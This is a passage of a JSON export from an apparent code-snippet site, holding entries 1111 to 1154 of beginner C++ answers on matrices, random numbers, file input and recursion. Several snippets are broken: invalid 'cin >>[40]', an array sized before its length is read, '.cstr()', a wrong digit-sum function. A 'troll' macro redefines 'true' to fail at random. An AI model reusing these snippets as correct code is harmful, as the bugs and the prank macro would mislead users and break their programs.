    "description": "#include <iostream> using namespace std;  //function declaration int addition(int a,int b);  int main() { \tint a,b;\t//to store numbers \tint add;\t//to store addition  \t \t//read numbers \tcout<<\"Enter first number: \"; \tcin>>a; \tcout<<\"Enter second number: \"; \tcin>>b; \t \t//call function \tadd=addition(a,b); \t \t//print addition \tcout<<\"Addition is: \"<<add<<endl; \t \treturn 0; }  //function definition int addition(int a,int b) { \treturn (a+b); }\n",
    "reg_date": "2021-10-12T11:38:26.000Z"
  },
  {
    "id": 1112,
    "keyword": null,
    "link": null,
    "title": " c++ program for matrix addition",
    "description": "#include <iostream> using namespace std;  int main() {     int r, c, a[100][100], b[100][100], sum[100][100], i, j;      cout << \"Enter number of rows (between 1 and 100): \";     cin >> r;      cout << \"Enter number of columns (between 1 and 100): \";     cin >> c;      cout << endl << \"Enter elements of 1st matrix: \" << endl;      // Storing elements of first matrix entered by user.     for(i = 0; i < r; ++i)        for(j = 0; j < c; ++j)        {            cout << \"Enter element a\" << i + 1 << j + 1 << \" : \";            cin >> a[i][j];        }      // Storing elements of second matrix entered by user.     cout << endl << \"Enter elements of 2nd matrix: \" << endl;     for(i = 0; i < r; ++i)        for(j = 0; j < c; ++j)        {            cout << \"Enter element b\" << i + 1 << j + 1 << \" : \";            cin >> b[i][j];        }      // Adding Two matrices     for(i = 0; i < r; ++i)         for(j = 0; j < c; ++j)             sum[i][j] = a[i][j] + b[i][j];      // Displaying the resultant sum matrix.     cout << endl << \"Sum of two matrix is: \" << endl;     for(i = 0; i < r; ++i)         for(j = 0; j < c; ++j)         {             cout << sum[i][j] << \"  \";             if(j == c - 1)                 cout << endl;         }      return 0; } \n",
    "reg_date": "2021-10-12T11:38:26.000Z"
  },
  {
    "id": 1113,
    "keyword": null,
    "link": null,
    "title": " c++ program for numerical solution of ordinary differential equations using euler method",
    "description": " #include<iostream>  /* defining ordinary differential equation to be solved */ /* In this example we are solving dy/dx = x + y */ #define f(x,y) x+y  using namespace std;  int main() {  float x0, y0, xn, h, yn, slope;  int i, n;   cout<<\"Enter Initial Condition\"<< endl;  cout<<\"x0 = \";  cin>> x0;  cout<<\"y0 = \";  cin >> y0;  cout<<\"Enter calculation point xn = \";  cin>>xn;  cout<<\"Enter number of steps: \";  cin>> n;   /* Calculating step size (h) */  h = (xn-x0)/n;   /* Euler's Method */  cout<<\"\\nx0\\ty0\\tslope\\tyn\\n\";  cout<<\"------------------------------\\n\";   for(i=0; i < n; i++)  {   slope = f(x0, y0);   yn = y0 + h * slope;   cout<< x0<<\"\\t\"<< y0<<\"\\t\"<< slope<<\"\\t\"<< yn<< endl;   y0 = yn;   x0 = x0+h;  }   /* Displaying result */  cout<<\"\\nValue of y at x = \"<< xn<< \" is \" << yn;   return 0; }   \n",
    "reg_date": "2021-10-12T11:38:27.000Z"
  },
  {
    "id": 1114,
    "keyword": null,
    "link": null,
    "title": " c++ program how to let the user choose different game modes",
    "description": "int getMode(int *virus, int *frequency, int numVir) {    int count = 0, \t   index = 0, \t   mode = 0, \t   frLow = 0,            total = 0;     for (index = 0; index < numVir; index++)    { \t  count = 1;  \t  while (*(virus + index) == *(virus + index + 1)) \t  { \t\t ++count; \t\t ++index; \t  } \t   \t  *(frequency + index) = count; \t   \t  if (*(frequency + index) > frLow) \t  { \t\t frLow = *(frequency + index);                  total += *(frequency + index); \t\t mode = *(virus + index); \t  }  \t  else if (frLow == 1 || frLow == *(frequency + index)) \t  { \t\t return -1; \t  }    }      return mode; }\n",
    "reg_date": "2021-10-12T11:38:27.000Z"
  },
  {
    "id": 1115,
    "keyword": null,
    "link": null,
    "title": " c++ program that calculates the distance covered by a vehicle given the speed and time.",
    "description": "#include <iostream> using namespace std; int main() {   int speed;   int km;   cout << \"Please enter the speed:\";   cin >>[40];    cout << \"please enter the total km traveled:\";   cin >> [100];   cout << endl << endl << \"it will take a cyclist\" << distance / speed << \"hours for the cyclist to get its\" << endl;   cout << \"destination.\";   return 0; }\n",
    "reg_date": "2021-10-12T11:38:27.000Z"
  },
  {
    "id": 1116,
    "keyword": null,
    "link": null,
    "title": " c++ program to count number of characters of words in a file using stringstream",
    "description": "string words[2000] = {\"\"}; // fills all elements with blank string int wordIndex = 0; while( fileToBeOpened.good() && wordIndex < 2000)     fileToBeOpened >> words[ wordIndex++ ];\n",
    "reg_date": "2021-10-12T11:38:27.000Z"
  },
  {
    "id": 1117,
    "keyword": null,
    "link": null,
    "title": " c++ program to find eigenvalues of a matrix",
    "description": " #include<iostream> #include<iomanip> #include<stdio.h> #include<math.h>  #define SIZE 10  using namespace std;  int main() { \t float a[SIZE][SIZE], x[SIZE],x_new[SIZE]; \t float temp, lambda_new, lambda_old, error; \t int i,j,n, step=1;       /* Setting precision and writing floating point values in fixed-point notation. */      cout<< setprecision(3)<< fixed;  \t /* Inputs */ \t /* Reading order of square matrix */ \t cout<<\"Enter Order of Matrix: \"; \t cin>>n;       /* Reading tolerable error */ \t cout<<\"Enter Tolerable Error: \"; \t cin>>error;  \t /* Reading Square Matrix of Order n */ \t cout<<\"Enter Coefficient of Matrix: \"<< endl; \t for(i=1;i<=n;i++) \t { \t\t  for(j=1;j<=n;j++) \t\t  { \t\t\t   cout<<\"a[\"<< i<<\"]\"<< j<<\"]= \";                cin>>a[i][j]; \t\t  } \t }  \t /* Reading Intial Guess Vector */ \t cout<<\"Enter Initial Guess Vector: \"<< endl; \t for(i=1;i<=n;i++) \t { \t\t  cout<<\"x[\"<< i<<\"]= \"; \t\t  cin>>x[i]; \t }  \t /* Initializing Lambda_Old */ \t lambda_old = 1; \t /* Multiplication */  \t /* Setting label for repetition */ \t up: \t for(i=1;i<=n;i++) \t { \t\t  temp = 0.0; \t\t  for(j=1;j<=n;j++) \t\t  { \t\t   \ttemp = temp + a[i][j]*x[j]; \t\t  } \t\t  x_new[i] = temp; \t }  \t /* Replacing x by x_new */ \t for(i=1;i<=n;i++) \t { \t  \tx[i] = x_new[i]; \t }  \t /* Finding largest value from x*/ \t lambda_new = fabs(x[1]); \t for(i=2;i<=n;i++) \t { \t\t  if(fabs(x[i])>lambda_new) \t\t  { \t\t   \tlambda_new = fabs(x[i]); \t\t  } \t }  \t /* Normalization */ \t for(i=1;i<=n;i++) \t { \t  \tx[i] = x[i]/lambda_new; \t }  \t /* Display */ \t cout<< endl<< endl<<\"STEP-\"<< step<< endl; \t cout<<\"Eigen Value = \"<< lambda_new<< endl; \t cout<<\"Eigen Vector: \"<< endl; \t cout<<\"[\"; \t for(i=1;i<=n;i++) \t { \t  \tcout<< x[i]<<\"\\t\"; \t }      cout<<\"\\b\\b\\b]\"; /* \\b is for backspace */  \t /* Checking Accuracy */ \t if(fabs(lambda_new-lambda_old)>error) \t { \t\t  lambda_old=lambda_new; \t\t  step++; \t\t  goto up; \t }  \t return(0); }  \n",
    "reg_date": "2021-10-12T11:38:27.000Z"
  },
  {
    "id": 1118,
    "keyword": null,
    "link": null,
    "title": " c++ program to find gcd of 3 numbers",
    "description": "#include<stdio.h> int main() {       int a,b,c,hcf,st;   printf(\"Enter three numbers : \");   scanf(\"%d,%d,%d\", &a,&b,&c);   st=a<b?(a<c?a:c):(b<c?b:c);   for (hcf=st;hcf>=1;hcf--) \t{  \t       if (a%hcf==0 && b%hcf==0 && c%hcf==0)       break;   }   printf(\"%d\",hcf); return 0; }\n",
    "reg_date": "2021-10-12T11:38:27.000Z"
  },
  {
    "id": 1119,
    "keyword": null,
    "link": null,
    "title": " c++ program to find the position of an element in an array",
    "description": "#include <iostream> using namespace std;   int main() {     int arr[] = { 6, 3, 5, 2, 8 };     int n = sizeof(arr)/sizeof(arr[0]);       int elem = 2;       int i = 0;     while (i < n)     {         if (arr[i] == elem) {             break;         }         i++;     }       if (i < n)     {         cout << \"Element \" << elem << \" is present at index \" << i              << \" in the given array\";     }     else {         cout << \"Element is not present in the given array\";     }       return 0; }\n#include <iostream> using namespace std;   \n",
    "reg_date": "2021-10-12T11:38:28.000Z"
  },
  {
    "id": 1120,
    "keyword": null,
    "link": null,
    "title": " c++ program to generate prime numbers",
    "description": "#include <iostream> using namespace std;  int main() {   int n, i;   bool isPrime = true;    cout << \"Enter a positive integer: \";   cin >> n;    for(i = 2; i <= n / 2; ++i)   {       if(n % i == 0)       {           isPrime = false;           break;       }   }   if (isPrime)       cout << \"This is a prime number\";   else       cout << \"This is not a prime number\";    return 0; }\n#include <iostream> using namespace std;  int main() {     int low, high, i;     bool isPrime = true;      cout << \"Enter two numbers (intervals): \";     cin >> low >> high;      cout << \"\\nPrime numbers between \" << low << \" and \" << high << \" are: \" << endl;      while (low < high) {         isPrime = true;         if (low == 0 || low == 1) {             isPrime = false;         }         else {             for (i = 2; i <= low / 2; ++i) {                 if (low % i == 0) {                     isPrime = false;                     break;                 }             }         }                  if (isPrime)             cout << low << \" \";          ++low;     }      return 0; } \n",
    "reg_date": "2021-10-12T11:38:28.000Z"
  },
  {
    "id": 1121,
    "keyword": null,
    "link": null,
    "title": " c++ program to input and print text using Dynamic Memory Allocation.loop",
    "description": "program to input and print text using Dynamic Memory Allocation.\n",
    "reg_date": "2021-10-12T11:38:28.000Z"
  },
  {
    "id": 1122,
    "keyword": null,
    "link": null,
    "title": " c++ program to print fibonacci series",
    "description": "#include<iostream> using namespace std; int main() {      int n;    int a[n];    cout<<\"Enter no of terms:-\\t\";    cin>>n;    a[0]=0;    a[1]=1;    cout<<a[0]<<\" \"<<a[1];    for (int i = 2; i <=n; i++)    {        a[i]=a[i-1]+a[i-2];        cout<<\" \";        cout<<a[i];    }  return 0; }\n",
    "reg_date": "2021-10-12T11:38:28.000Z"
  },
  {
    "id": 1123,
    "keyword": null,
    "link": null,
    "title": " c++ program to reverse an array",
    "description": "#include <iostream> using namespace std; int main() {\t\t// While loop \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t   \treturn 0; } \n#include<iostream> using namespace std; int main() {    int a[]={1,2,3,4,5};  // Using Pointer and Array Relationship     for (int i = 4; i>=0; i--)     cout<<*(a+i);    return 0; }\n#include <iostream> using namespace std; int main() { \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint end = SIZE - 1, temp; \tfor (int i = 0; i < end; i++) \t{ \t\ttemp = arr[i]; \t\tarr[i] = arr[end]; \t\tarr[end] = temp; \t\tend--; \t} \t/*\tReverse using while loop \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t}*/ \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t \t} \n#include<iostream> using namespace std; int main() {         int n=3;      int arr[]={1,2,3,4};       while (n>=0)     {         cout<<arr[n];         n--;       }               return 0; }\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1124,
    "keyword": null,
    "link": null,
    "title": " c++ programming",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \nC++ is a general-purpose programming language created by Bjarne  Stroustrup as an extension of the C programming language, or  \"C with Classes\".  //as you can also see to your right ---------------------->  C++ still qualifies as a high-level languge, yet the rise of  languages like Ruby and Java have given capabilities that sway people's opinion towards what is and is not \"high-level\".   Yet high-level simply means it's farther from machine code and closer  to human-readable form. Hence the need for a compiler/interpreter.  So don't get too worked up about granular specifics. \nC++ is a high-level, general-purpose programming language.  //totally not right there ----------------------------------->\ngame code =  the amount it  loads =  the  creator of the game  the wifi it takes =  the minutes it loads =  the date it was made =  \n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1125,
    "keyword": null,
    "link": null,
    "title": " c++ progress bar",
    "description": "        cout << \"[\";         int pos = value;         for (int i = 0; i < 100;i++) {             if (i < pos)             {                 cout << \"=\";             }             else if (i == pos)             {                 cout << \">\";             }             else             {                 cout << \" \";             }         }          cout << \"] \" << int(value) << \" %\\r\";         cout.flush();\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1126,
    "keyword": null,
    "link": null,
    "title": " c++ public inheritance not getting protected",
    "description": "class A  { public:     int x; protected:     int y; private:     int z; };  class B : public A {     // x is public     // y is protected     // z is not accessible from B };  class C : protected A {     // x is protected     // y is protected     // z is not accessible from C };  class D : private A    // 'private' is default for classes {     // x is private     // y is private     // z is not accessible from D };\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1127,
    "keyword": null,
    "link": null,
    "title": " c++ put a function in a other thread",
    "description": "void task1(std::string msg) {     std::cout << \"task1 says: \" << msg; } std::thread t1(task1, \"Hello\");\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1128,
    "keyword": null,
    "link": null,
    "title": " c++ pwstr to char*",
    "description": "PWSTR myPwstr;  std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> convert; std::string stringified = convert.to_bytes(myPwstr);  const char* result = stringified.cstr();\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1129,
    "keyword": null,
    "link": null,
    "title": " c++ qt QFuture",
    "description": "QFuture<int> intFuture = QtFuture::connect(&object, &MyObject::mySignal);\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1130,
    "keyword": null,
    "link": null,
    "title": " c++ question mark",
    "description": "variable ? value if true : value if false;\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1131,
    "keyword": null,
    "link": null,
    "title": " c++ queue front",
    "description": "// queue::front #include <iostream>       // std::cout #include <queue>          // std::queue  int main () {   std::queue<int> myqueue;    myqueue.push(77);   myqueue.push(16);    myqueue.front() -= myqueue.back();    // 77-16=61    std::cout << \"myqueue.front() is now \" << myqueue.front() << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:29.000Z"
  },
  {
    "id": 1132,
    "keyword": null,
    "link": null,
    "title": " c++ rainbow text",
    "description": "`enter code here`#include <stdafx.h> // Used with MS Visual Studio Express. Delete line if using something different #include <conio.h> // Just for WaitKey() routine #include <iostream> #include <string> #include <windows.h>  using namespace std;  HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE); // For use of SetConsoleTextAttribute()  void WaitKey();  int main() {      int len = 0,x, y=240; // 240 = white background, black foreground       string text = \"Hello World. I feel pretty today!\";     len = text.length();     cout << endl << endl << endl << \"\\t\\t\"; // start 3 down, 2 tabs, right     for ( x=0;x<len;x++)     {         SetConsoleTextAttribute(console, y); // set color for the next print         cout << text[x];         y++; // add 1 to y, for a new color         if ( y >254) // There are 255 colors. 255 being white on white. Nothing to see. Bypass it             y=240; // if y > 254, start colors back at white background, black chars         Sleep(250); // Pause between letters      }      SetConsoleTextAttribute(console, 15); // set color to black background, white chars     WaitKey(); // Program over, wait for a keypress to close program }   void WaitKey() {     cout  << endl << endl << endl << \"\\t\\t\\tPress any key\";     while (_kbhit()) _getch(); // Empty the input buffer     _getch(); // Wait for a key     while (_kbhit()) _getch(); // Empty the input buffer (some keys sends two messages) }\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1133,
    "keyword": null,
    "link": null,
    "title": " c++ rand include",
    "description": "#include<cstdlib>\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1134,
    "keyword": null,
    "link": null,
    "title": " c++ random",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <iostream> #include <stdlib.h>      #include <time.h>  using namespace std;  int main() { \tint num; \tsrand(time(0)); \t\tnum = rand() % 10 + 1; \t\tcout << num << endl; } \n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1135,
    "keyword": null,
    "link": null,
    "title": " c++ random between two values",
    "description": "#include <iostream> #include <ctime> #include <cstdlib> using namespace std; int main()  {     srand(time(0));  // Initialize random number generator.           cout<<\"Random numbers generated between 1 and 10:\"<<endl;     for(int i=0;i<10;i++)         cout << (rand() % 10) + 1<<\" \";      return 0;  } \n#include <stdio.h>      /* NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int Main() {   int randomNumber;    /* initialize random seed: */   srand (time(NULL));    /* generate random number between 1 and 10: */   randomNumber = rand() % 10 + 1; \tv1 = rand() % 100;         // v1 in the range 0 to 99 \tv2 = rand() % 100 + 1;     // v2 in the range 1 to 100 \tv3 = rand() % 30 + 1985;   // v3 in the range 1985-2014  }\nint randNum = rand()%(max-min + 1) + min; \n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1136,
    "keyword": null,
    "link": null,
    "title": " c++ random float",
    "description": "float get_random() {     static std::default_random_engine e;     static std::uniform_real_distribution<> dis(0, 1); // rage 0 - 1     return dis(e); } \nfloat r3 = LO + static_cast <float> (rand()) /( static_cast <float> (RAND_MAX/(HI-LO))); \n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1137,
    "keyword": null,
    "link": null,
    "title": " c++ random int troll",
    "description": "#include <ctime> #define true time(NULL) % 100 != 0\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1138,
    "keyword": null,
    "link": null,
    "title": " c++ random number 0 to 1",
    "description": "#include <iostream> #include <ctime> #include <cstdlib> using namespace std; int main()  {     srand(time(0));  // Initialize random number generator.           cout<<\"Random numbers generated between 1 and 10:\"<<endl;     for(int i=0;i<10;i++)         cout << (rand() % 10) + 1<<\" \";      return 0;  } \n#include <iostream> #include <string> #include <random>  int main() {     std::mt19937 gen (123);     std::uniform_real_distribution<double> dis(0.0, 1.0);     double x = dis(gen);     std::cout << x << std::endl; }\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1139,
    "keyword": null,
    "link": null,
    "title": " c++ random number between 1 and 10",
    "description": "cout << (rand() % 10) + 1<<\" \"; \n#include <iostream> #include <ctime> #include <cstdlib> using namespace std; int main()  {     srand(time(0));  // Initialize random number generator.           cout<<\"Random numbers generated between 1 and 10:\"<<endl;     for(int i=0;i<10;i++)         cout << (rand() % 10) + 1<<\" \";      return 0;  } \n#include <time.h> // So we can use time() function #include <iostream> // To output results to console  int main() // Main function required in all C++ programs and first function to be called { \tsrand( time(NULL) ); //Randomize seed initialization \tint randNum = rand() % 2; // Generate a random number between 0 and 1  \tstd::cout << randNum; // Output the results to console \treturn 0; //Generate an \"EXIT SUCCESS\" return code }\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1140,
    "keyword": null,
    "link": null,
    "title": " c++ random number generator uniform distribution",
    "description": "#include<bits/stdc++.h> using namespace std ; default_random_engine seed; int main() {           for(int i= 10;i>0;i--)      cout<<uniform_int_distribution<int>(0, i)(seed)<<\" \";     return 0 ; }\n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1141,
    "keyword": null,
    "link": null,
    "title": " c++ raw string",
    "description": "//EXAMPLE std::string sRaw = R\"(aaa\\ttt %)\";     //   aaa/ttt % std::string sNonRaw = \"aaa\\ttt %\";   //     aaa     tt % std::cout << sRaw << \"\\n\"; std::cout << sNonRaw << \"\\n\";  //SYNTAX // R\"(<string-with-raw-values>)\" // R\"(...)\"\n#include <iostream>   int main() {  \t \t//Display in Multiline using escape character /n \tconst char* example2 = \"Line1\\n\" \t\"Line2\\n\" \t\t\"Line3\\n\" \t\t\"Line4\\n\" \t\t; \tstd::cout << example2 << std::endl; \tstd::cout << \"===================================\" << std::endl; \t// display in multiline using Raw \tconst char* example = R\"(Line1 Line2 Line3  Line4  )\";//no need to use escape character  /n \tstd::cout << example << std::endl;  \tstd::cin.get(); } \n",
    "reg_date": "2021-10-12T11:38:30.000Z"
  },
  {
    "id": 1142,
    "keyword": null,
    "link": null,
    "title": " c++ read ascii",
    "description": "noanswersatallinhere....\n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1143,
    "keyword": null,
    "link": null,
    "title": " c++ read console input",
    "description": "// Include the library for console in-/outputs #include <iostream> // Include the libary for strings #include <string>  // Main function int main() {   // Initialize variable   std::string value;   // Read from console   std::getline(std::cin, value); }\nint age; cin >> age;\n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1144,
    "keyword": null,
    "link": null,
    "title": " c++ read each char of string",
    "description": "std::string str = ???; for(std::string::iterator it = str.begin(); it != str.end(); ++it) {     do_things_with(*it); } \n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1145,
    "keyword": null,
    "link": null,
    "title": " c++ read file line by line",
    "description": "#include <iostream> #include <ifstream> #include <string>  using namespace std;  ifstream file(\"file.txt\"); if (file.is_open()) { \tstring line; \twhile (getline(file, line))     {     \t// note that the newline character is not included         // in the getline() function     \tcout << line << endl;     } }\n#include <iostream> #include <fstream> #include <string> using namespace std; int main(){    fstream newfile;    newfile.open(\"tpoint.txt\",ios::out);  // open a file to perform write operation using file object    if(newfile.is_open()) //checking whether the file is open    {       newfile<<\"Tutorials point \\n\";   //inserting text       newfile.close();    //close the file object    }    newfile.open(\"tpoint.txt\",ios::in); //open a file to perform read operation using file object    if (newfile.is_open()){   //checking whether the file is open       string tp;       while(getline(newfile, tp)){ //read data from file object and put it into string.          cout << tp << \"\\n\"; //print the data of the string       }       newfile.close(); //close the file object.    } }\n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1146,
    "keyword": null,
    "link": null,
    "title": " c++ read file to char buffer",
    "description": "std::ifstream in(\"FileReadExample.cpp\"); std::string contents((std::istreambuf_iterator<char>(in)),      std::istreambuf_iterator<char>()); \n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1147,
    "keyword": null,
    "link": null,
    "title": " c++ read integers from file",
    "description": "int main() { \t     ifstream file(\"o.txt\");   \t     int num;     while (file >> num){       //whatever you need to do     }   \t }\n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1148,
    "keyword": null,
    "link": null,
    "title": " c++ read matttrix from text file",
    "description": "\t ifstream f(\"matrix.txt\"); f >> m >> n;  if ((m != 4) || (n != 3))   {   cout << \"Matrix not 4 by 3!n\";   return 1;   }  for (int i = 0; i < m; i++) for (int j = 0; j < m; j++)   f >> A[i][j];\n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1149,
    "keyword": null,
    "link": null,
    "title": " c++ read text file to string",
    "description": "#include <fstream> #include <string> using namespace std;  int main() {   ifstream ifs(\"myfile.txt\");   //Two ways:      //Assign it at initialization   string content( (istreambuf_iterator<char>(ifs) ),                   (istreambuf_iterator<char>()    ) );      //Assign it after initialization   content.assign( (istreambuf_iterator<char>(ifs) ),                   (istreambuf_iterator<char>()    ) );   return 0; }\nstring filetostring(){ \tifstream file(\"file\", ios::binary);     string fileStr;      istreambuf_iterator<char> inputIt(file), emptyInputIt;     back_insert_iterator<string> stringInsert(fileStr);      copy(inputIt, emptyInputIt, stringInsert);      return fileStr; }\n#include<iostream> #include<fstream>  using namespace std;  int main() {   ifstream myReadFile;  myReadFile.open(\"text.txt\");  char output[100];  if (myReadFile.is_open()) {  while (!myReadFile.eof()) {       myReadFile >> output;     cout<<output;    } } myReadFile.close(); return 0; }  \n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1150,
    "keyword": null,
    "link": null,
    "title": " c++ reading string",
    "description": "#include <string> std::string str; std::getline(std::cin, str); // The output of std::getline(std::cin, str) will be stored in str.\n#include <iostream> #include <string> string str; getline(cin, str); //str contains line\n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1151,
    "keyword": null,
    "link": null,
    "title": " c++ recorrer string",
    "description": "std::string Find(std::string const& palabra, std::string const& delim, int & init) {   int end = palabra.find(delim, prev);   std::string toReturn = palabra.substr(init, end - init);   init = end;   return toReturn; }  std::string s = \"Hola-perro-Cosa\"; int init = 0; std::string string1 = Find(s, \"-\", init); std::string string2 = Find(s, \"-\", init); std::string string3 = Find(s, \"-\", init); \nstd::string s = \"Hola-perro-Cosa\"; int init = 0; int end = 0; while( end = s.find(\"-\", init), end >= 0 ) {   std::cout << s.substr(init, end - init) << '\\n';   init = end + 1; } std::cout << s.substr(init); \n",
    "reg_date": "2021-10-12T11:38:31.000Z"
  },
  {
    "id": 1152,
    "keyword": null,
    "link": null,
    "title": " c++ recursion",
    "description": "//AUTHOR:praveen //Function calling itself  //Example in c++ #include<iostream> using namespace std; int recursion(int a){   \tif(a==1)//BASE CASE       return 0; \tcout<<a;   \ta=a-1;   \treturn recursion(a);//FUNCTION CALLING ITSELF } int main(){   \tint a=5;  \trecursion(a);   \treturn 0; } //OUTPUT: 5 4 3 2 \n#include <iostream> #include <cstdlib> //had to force it becasue my compiler (Code::Blocks) does not contain system.  using namespace std; /*int n = 1, sum = 0;  int sumDigits(int n, int sum) {     // \tif (n == 0)     {         return sum;     }     else     {         // applying recursion and returning the value into the function         sum = sum + n\u0010; \t\tn= n/10;         return sumDigits(n, sum);     } }  int main(int argc, char* argv[]) { \tn = 1, sum = 0;          cout << \"Enter a non-negative integer: \";         cin >> n;         sum = sumDigits (n, sum);         cout << \"The sum of all digits \"<< n << \" is: \" << sum << endl;  \tsystem (\"PAUSE\");          return 0; } */  int sumDigits(int &);  int main() { \tint n; \tsumDigits(n); }  int sumDigits(int &n) {     cout << \"Enter a non-negative integer: \";     cin >> n;         if (n == 1)         {             return 1;         }         else         {             return (n - 1) + n;         }     cout << \"The sum of all digits \"<< n << \" is: \" << n << endl;   \tsystem (\"PAUSE\");          return 0; }\nvoid sum_digits(int & n, int & sum) {   if ( n == 0 ) return;   sum += n % 10;   n /= 10;   sum_digits(n, sum); }  #include <iostream> using namespace std;  int main() {   int n, sum=0;   cout << \"enter a non-negative number\" << endl;   cin >> n;   if ( n < 0 ) return -1; // don't trust the user   sum_digits(n,sum);   cout << \"sum is \" << sum << endl; }\n//recursion in c++ //factorial #include<iostream> #include<bits/stdc++.h> using namespace std;  int factorialfun(int num) { \tif (num>0) \t{ \t\treturn num*factorialfun(num-1); \t} \telse \t{ \t\treturn 1; \t} } int main() { \tint num; \tcin>>num; \tcout<<factorialfun(num); } \n// Factorial of n = 1*2*3*...*n #include <iostream> using namespace std;  int factorial(int);  int main() {     int n, result;      cout << \"Enter a non-negative number: \";     cin >> n;      result = factorial(n);     cout << \"Factorial of \" << n << \" = \" << result;     return 0; }  int factorial(int n) {     if (n > 1) {         return n * factorial(n - 1);     } else {         return 1;     } }\n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1153,
    "keyword": null,
    "link": null,
    "title": " c++ regester shortcut in windows",
    "description": " #include \"stdafx.h\"  int _cdecl _tmain (     int argc,      TCHAR *argv[]) {                if (RegisterHotKey(         NULL,         1,         MOD_ALT | MOD_NOREPEAT,         0x42))  //0x42 is 'b'     {         _tprintf(_T(\"Hotkey 'ALT+b' registered, using MOD_NOREPEAT flag\\n\"));     }       MSG msg = {0};     while (GetMessage(&msg, NULL, 0, 0) != 0)     {         if (msg.message == WM_HOTKEY)         {             _tprintf(_T(\"WM_HOTKEY received\\n\"));                     }     }        return 0; }  \n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1154,
    "keyword": null,
    "link": null,
    "title": " c++ regex email validation",
